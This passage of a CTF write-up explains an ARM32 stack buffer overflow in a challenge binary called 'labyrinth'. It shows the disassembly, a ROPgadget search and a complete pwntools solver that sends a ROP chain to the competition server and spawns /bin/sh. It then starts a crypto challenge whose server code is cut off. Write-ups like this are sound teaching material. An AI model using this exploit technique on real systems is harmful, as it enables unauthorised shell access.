<p>In this challenge, we were given a binary called <code>labyrinth</code>, which is an ARM32 binary. Let&rsquo;s disassemble the binary and take a closer look.</p>
<p><strong>main</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-s" data-lang="s"><span class="line"><span class="cl"><span class="n">EXPORT</span> <span class="n">main</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">var_20</span><span class="o">=</span> <span class="m">-0</span><span class="n">x20</span>
</span></span><span class="line"><span class="cl"><span class="n">var_1C</span><span class="o">=</span> <span class="m">-0</span><span class="n">x1C</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">PUSH</span>            <span class="p">{</span><span class="n">R7</span><span class="p">,</span><span class="n">LR</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">SUB</span>             <span class="n">SP</span><span class="p">,</span> <span class="n">SP</span><span class="p">,</span> <span class="c1">#0x20</span>
</span></span><span class="line"><span class="cl"><span class="n">ADD</span>             <span class="n">R7</span><span class="p">,</span> <span class="n">SP</span><span class="p">,</span> <span class="c1">#0</span>
</span></span><span class="line"><span class="cl"><span class="n">STR</span>             <span class="n">R0</span><span class="p">,</span> <span class="n">[R7</span><span class="p">,</span><span class="c1">#0x20+var_1C]</span>
</span></span><span class="line"><span class="cl"><span class="n">STR</span>             <span class="n">R1</span><span class="p">,</span> <span class="n">[R7</span><span class="p">,</span><span class="c1">#0x20+var_20]</span>
</span></span><span class="line"><span class="cl"><span class="n">BL</span>              <span class="n">init</span>
</span></span><span class="line"><span class="cl"><span class="n">ADD.W</span>           <span class="n">R3</span><span class="p">,</span> <span class="n">R7</span><span class="p">,</span> <span class="c1">#8</span>
</span></span><span class="line"><span class="cl"><span class="n">MOV.W</span>           <span class="n">R2</span><span class="p">,</span> <span class="c1">#0x100 ; nbytes</span>
</span></span><span class="line"><span class="cl"><span class="n">MOV</span>             <span class="n">R1</span><span class="p">,</span> <span class="n">R3</span>  <span class="p">;</span> <span class="n">buf</span>
</span></span><span class="line"><span class="cl"><span class="n">MOVS</span>            <span class="n">R0</span><span class="p">,</span> <span class="c1">#0  ; fd</span>
</span></span><span class="line"><span class="cl"><span class="n">BLX</span>             <span class="n">read</span>
</span></span><span class="line"><span class="cl"><span class="n">MOVS</span>            <span class="n">R3</span><span class="p">,</span> <span class="c1">#0</span>
</span></span><span class="line"><span class="cl"><span class="n">MOV</span>             <span class="n">R0</span><span class="p">,</span> <span class="n">R3</span>
</span></span><span class="line"><span class="cl"><span class="n">ADDS</span>            <span class="n">R7</span><span class="p">,</span> <span class="c1">#0x20 ; &#39; &#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">MOV</span>             <span class="n">SP</span><span class="p">,</span> <span class="n">R7</span>
</span></span><span class="line"><span class="cl"><span class="n">POP</span>             <span class="p">{</span><span class="n">R7</span><span class="p">,</span><span class="n">PC</span><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This is ARM architecture assembly, and looking through this small assembly code, we can observe that there is a buffer overflow bug, where the <code>stack</code> size of the main function is <code>0x20</code>, but we can read <code>0x100</code> bytes to <code>SP+0x8</code>. It is very straightforward that we need to perform ROP with this buffer overflow to spawn a shell, so let&rsquo;s try to find some good gadgets that we can use.</p>
<p>Looking through the other available functions, we can see that there are two interesting functions called <code>a</code> and <code>b</code>.</p>
<p><strong>a</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-s" data-lang="s"><span class="line"><span class="cl"><span class="n">EXPORT</span> <span class="n">a</span>
</span></span><span class="line"><span class="cl"><span class="n">a</span>
</span></span><span class="line"><span class="cl"><span class="n">PUSH</span>            <span class="p">{</span><span class="n">R7</span><span class="p">,</span><span class="n">LR</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">ADD</span>             <span class="n">R7</span><span class="p">,</span> <span class="n">SP</span><span class="p">,</span> <span class="c1">#0</span>
</span></span><span class="line"><span class="cl"><span class="n">LDR</span>             <span class="n">R3</span><span class="p">,</span> <span class="o">=</span><span class="p">(</span><span class="n">binsh</span> <span class="o">-</span> <span class="mh">0x10542</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ADD</span>             <span class="n">R3</span><span class="p">,</span> <span class="n">PC</span>  <span class="p">;</span> <span class="n">binsh</span>
</span></span><span class="line"><span class="cl"><span class="n">LDR</span>             <span class="n">R3</span><span class="p">,</span> <span class="n">[R3]</span> <span class="p">;</span> <span class="s">&#34;/bin/sh&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">MOV</span>             <span class="n">R0</span><span class="p">,</span> <span class="n">R3</span>  <span class="p">;</span> <span class="n">s</span>
</span></span><span class="line"><span class="cl"><span class="n">BLX</span>             <span class="n">puts</span>
</span></span><span class="line"><span class="cl"><span class="n">NOP</span>
</span></span><span class="line"><span class="cl"><span class="n">POP</span>             <span class="p">{</span><span class="n">R7</span><span class="p">,</span><span class="n">PC</span><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>b</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-s" data-lang="s"><span class="line"><span class="cl"><span class="n">EXPORT</span> <span class="n">b</span>
</span></span><span class="line"><span class="cl"><span class="n">b</span>
</span></span><span class="line"><span class="cl"><span class="n">PUSH</span>            <span class="p">{</span><span class="n">R7</span><span class="p">,</span><span class="n">LR</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">ADD</span>             <span class="n">R7</span><span class="p">,</span> <span class="n">SP</span><span class="p">,</span> <span class="c1">#0</span>
</span></span><span class="line"><span class="cl"><span class="n">LDR</span>             <span class="n">R3</span><span class="p">,</span> <span class="o">=</span><span class="p">(</span><span class="n">command</span> <span class="o">-</span> <span class="mh">0x1055A</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ADD</span>             <span class="n">R3</span><span class="p">,</span> <span class="n">PC</span>  <span class="p">;</span> <span class="n">command</span>
</span></span><span class="line"><span class="cl"><span class="n">LDR</span>             <span class="n">R3</span><span class="p">,</span> <span class="n">[R3]</span> <span class="p">;</span> <span class="s">&#34;id&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">MOV</span>             <span class="n">R0</span><span class="p">,</span> <span class="n">R3</span>  <span class="p">;</span> <span class="n">command</span>
</span></span><span class="line"><span class="cl"><span class="n">BLX</span>             <span class="n">system</span>
</span></span><span class="line"><span class="cl"><span class="n">NOP</span>
</span></span><span class="line"><span class="cl"><span class="n">POP</span>             <span class="p">{</span><span class="n">R7</span><span class="p">,</span><span class="n">PC</span><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Based on these two functions, we can see that the binary already provide us good gadgets that we can use, which are:</p>
<ul>
<li>The binary already has a sequence of instructions that can call <code>system</code> (which is in <code>b</code>).</li>
<li>The binary already has a <code>/bin/sh</code> string that we can use as the parameter for the above gadget.</li>
</ul>
<p>Using this information that we have gathered, we can start to craft our solution.</p>
<h3 id="solution-2">Solution</h3>
<p>First, let&rsquo;s start by calculating the offset that we need to use to control the instruction pointer. Observe that in the <code>main</code> function:</p>
<ul>
<li>We can read <code>buffer</code> starting from <code>sp+8</code></li>
<li>There is an extra <code>POP {R7, PC}</code> before the <code>main</code> function returns. Remember that this is a 32-bit binary, so the <code>POP</code> will only consume <code>4</code> bytes.</li>
</ul>
<p>The stack size is <code>0x20</code>, and based on those 2 pieces of information, we need to fill the <code>buffer</code> with data of length <code>(0x20-0x8)+0x4 = 0x1c</code>. After filling the <code>buffer</code> with <code>0x1c</code> data, the next data that we send will overwrite the next instruction pointer.</p>
<p>To spawn a shell, we need to call <code>system(&quot;/bin/sh&quot;)</code>. In ARM32, the first parameter of the function needs to be put in the <code>R0</code> register. Observe that in the <code>b</code> function, we already have this gadget:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-s" data-lang="s"><span class="line"><span class="cl"><span class="n">MOV</span>             <span class="n">R0</span><span class="p">,</span> <span class="n">R3</span>  <span class="p">;</span> <span class="n">command</span>
</span></span><span class="line"><span class="cl"><span class="n">BLX</span>             <span class="n">system</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>And using the help of <code>ROPGadget</code>, we can see that there is a good gadget that can set the <code>R3</code> value.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ROPgadget --binary ./chall --only <span class="s2">&#34;pop&#34;</span>    
</span></span><span class="line"><span class="cl">Gadgets <span class="nv">information</span>
</span></span><span class="line"><span class="cl"><span class="o">============================================================</span>
</span></span><span class="line"><span class="cl">0x000103bc : pop <span class="o">{</span>r3, pc<span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Unique gadgets found: <span class="m">1</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can use this gadget to fill the <code>r3</code> with the <code>/bin/sh</code> address, then use the <code>system</code> gadget to spawn the shell. Below is the solver that I used to solve the challenge.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;137.184.6.25&#39;</span><span class="p">,</span> <span class="mi">17002</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="mh">0x0001062c</span>     <span class="c1"># binsh str</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_r3_pc</span> <span class="o">=</span> <span class="mh">0x000103bc</span> <span class="c1"># pop {r3, pc}</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="mh">0x1055a</span>       <span class="c1"># mov r0, r3; blx system</span>
</span></span><span class="line"><span class="cl"><span class="n">puts</span> <span class="o">=</span> <span class="mh">0x10538</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x1c</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_r3_pc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notice that I incremented the <code>system</code> gadget address by 1, because somehow there is an alignment in ARM32 CPU instruction which sometimes requires us to shift the address of the gadget a little up or down.</p>
<blockquote>
<p><strong>Flag: CJ2023{6fb2ad4fe1019c980a3d67b6754733ec}</strong></p>
</blockquote>
<h1 id="crypto">Crypto</h1>
<h2 id="daruma">daruma</h2>
<div class="details admonition quote open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>Software audit is so cringe bro, why don&rsquo;t we do <a href="https://is.its.ac.id/pubs/oajis/index.php/home/detail/1554/ALGORITMA-AUTHENTICATED-ENCRYPTION-PUBLIC-KEY-CRYPTO-SYSTEM-BERBASIS-CARMICHAEL-FUNCTION-AECF" target="_blank" rel="noopener noreffer ">paper</a> audit instead</p>
<p>nc 178.128.102.145 50001</p>
</div>
        </div>
    </div>
<h3 id="initial-analysis-3">Initial Analysis</h3>
<p>In this challenge, we were given a file called <code>challenge.py</code> which is the source code of the server.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">AECF</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">p</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">q</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">g</span><span class="o">=</span><span class="mi">2</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="n">p</span> <span class="ow">or</span> <span class="n">getPrime</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">q</span> <span class="o">=</span> <span class="n">q</span> <span class="ow">or</span> <span class="n">getPrime</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">n</span> <span class="o">=</span> <span class="n">p</span> <span class="o">*</span> <span class="n">q</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">g</span> <span class="o">=</span> <span class="n">g</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">n2</span> <span class="o">=</span> <span class="n">n</span><span class="o">**</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">totient</span> <span class="o">=</span> <span class="n">n</span> <span class="o">*</span> <span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">q</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">k</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randrange</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">n2</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">GCD</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">k</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">n2</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">e</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randrange</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">totient</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">GCD</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">e</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">totient</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">d</span> <span class="o">=</span> <span class="n">inverse</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">e</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">totient</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">l</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">n2</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">beta</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">g</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">l</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">n2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">public_key</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">n2</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">e</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">beta</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">private_key</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">d</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">l</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">encrypt_and_sign</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">plaintext</span><span class="p">,</span> <span class="n">public</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">n2</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">beta</span> <span class="o">=</span> <span class="n">public</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">m</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">plaintext</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">k</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">n2</span><span class="p">)</span> <span class="o">%</span> <span class="n">n2</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span> <span class="o">=</span> <span class="n">m</span> <span class="o">*</span> <span class="bp">self</span><span class="o">.</span><span class="n">k</span> <span class="o">*</span> <span class="nb">pow</span><span class="p">(</span><span class="n">beta</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">l</span><span class="p">,</span> <span class="n">n2</span><span class="p">)</span> <span class="o">%</span> <span class="n">n2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">r</span><span class="p">,</span> <span class="n">s</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">decrypt_and_verify</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">r</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">beta</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">m</span> <span class="o">=</span> <span class="n">s</span> <span class="o">*</span> <span class="n">inverse</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">d</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">n2</span><span class="p">),</span> <span class="bp">self</span><span class="o">.</span><span class="n">n2</span><span class="p">)</span> <span class="o">*</span> \
</span></span><span class="line"><span class="cl">            <span class="n">inverse</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">beta</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">l</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">n2</span><span class="p">),</span> <span class="bp">self</span><span class="o">.</span><span class="n">n2</span><span class="p">)</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">n2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">FLAG</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;flag.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">bob</span> <span class="o">=</span> <span class="n">AECF</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">enc_flag</span> <span class="o">=</span> <span class="n">bob</span><span class="o">.</span><span class="n">encrypt_and_sign</span><span class="p">(</span><span class="n">FLAG</span><span class="p">,</span> <span class="n">bob</span><span class="o">.</span><span class="n">public_key</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="n">bob</span><span class="o">.</span><span class="n">decrypt_and_verify</span><span class="p">(</span><span class="o">*</span><span class="n">enc_flag</span><span class="p">,</span> <span class="n">bob</span><span class="o">.</span><span class="n">beta</span><span class="p">)</span> <span class="o">==</span> <span class="n">FLAG</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Encrypted flag:&#34;</span><span class="p">,</span> <span class="n">enc_flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Bob public key:&#34;</span><span class="p">,</span> <span class="n">bob</span><span class="o">.</span><span class="n">public_key</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span><span class="o">*</span><span class="mi">40</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">n</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;Your public modulus: &#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">n</span><span class="o">.</span><span class="n">bit_length</span><span class="p">()</span> <span class="o">&lt;</span> <span class="mi">2000</span> <span class="ow">or</span> <span class="n">n</span><span class="o">.</span><span class="n">bit_length</span><span class="p">()</span> <span class="o">&gt;</span> <span class="mi">10000</span> <span class="ow">or</span> <span class="n">isPrime</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Insecure modulus&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">e</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;Your public e: &#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">beta</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;Your public beta: &#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">message</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;Message you want to encrypt and sign: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">c</span> <span class="o">=</span> <span class="n">bob</span><span class="o">.</span><span class="n">encrypt_and_sign</span><span class="p">(</span><span class="n">message</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">beta</span><span class="p">))</span>
